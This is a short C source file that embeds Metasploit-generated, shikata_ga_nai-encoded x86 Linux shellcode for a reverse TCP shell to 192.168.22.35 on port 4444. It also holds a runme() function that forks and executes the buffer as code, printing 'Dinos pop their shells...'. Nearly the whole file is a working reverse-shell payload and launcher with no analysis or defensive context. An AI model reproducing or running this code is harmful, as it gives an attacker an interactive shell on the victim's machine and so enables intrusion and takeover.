#include <stdio.h>
#include <unistd.h>

#include <stdlib.h>
#include <sys/types.h>
#include <sys/wait.h>

/*
 * linux/x86/shell_reverse_tcp - 135 bytes
 * http://www.metasploit.com
 * Encoder: x86/shikata_ga_nai
 * NOP gen: x86/single_byte
 * VERBOSE=false, LHOST=192.168.22.35, LPORT=4444,
 * ReverseAllowProxy=false, ReverseConnectRetries=5,
 * ReverseListenerThreaded=false, PrependFork=false,
 * PrependSetresuid=false, PrependSetreuid=false,
 * PrependSetuid=false, PrependSetresgid=false,
 * PrependSetregid=false, PrependSetgid=false,
 * PrependChrootBreak=false, AppendExit=false,
 * InitialAutoRunScript=, AutoRunScript=, CMD=/bin/sh
 */
unsigned char buf[] =
"\x5b\x5e\x16\x46\x98\x5b\x99\x60\x42\x52\xfd\xf8\x93\xf9\x1e"
"\x97\x51\x06\x9b\x99\x37\xf8\x97\xf5\x5f\xf5\x5e\x5a\x57\x45"
"\x95\x41\x37\x37\x45\x57\x9f\x52\x41\x47\xb8\x16\xe5\x11\xe4"
"\xd9\xd0\xd9\x74\x24\xf4\x5d\x31\xc9\xb1\x12\x31\x45\x12\x83"
"\xed\xfc\x03\x53\xeb\xf3\x11\x6a\x28\x04\x3a\xdf\x8d\xb8\xd7"
"\xdd\x98\xde\x98\x87\x57\xa0\x4a\x1e\xd8\x9e\xa1\x20\x51\x98"
"\xc0\x48\xa2\xf2\x25\xab\x4a\x01\x4a\xba\xd6\x8c\xab\x0c\x80"
"\xde\x7a\x3f\xfe\xdc\xf5\x5e\xcd\x63\x57\xc8\xa0\x4c\x2b\x60"
"\x55\xbc\xe4\x12\xcc\x4b\x19\x80\x5d\xc5\x3f\x94\x69\x18\x3f";
 
#define die(e) do { fprintf(stderr, "%s\n", e); exit(EXIT_FAILURE); } while (0);

void runme(void)
{
	puts("Dinos pop their shells...");

	int link[2];
	pid_t pid;
	char foo[4096];

	if (pipe(link)==-1)
		die("pipe");

	if ((pid = fork()) == -1)
		die("fork");

	if(pid == 0) {

		dup2 (link[1], STDOUT_FILENO);
		close(link[0]);
		close(link[1]);
		
        int (*ret)() = (int(*)())buf;
		ret();

		sleep(15);
		return;

	} else {

		close(link[1]);
		int nbytes = read(link[0], foo, sizeof(foo));
	
		printf("Output: (%.*s)\n", nbytes, foo);
		wait(NULL);

	}
	return;
}
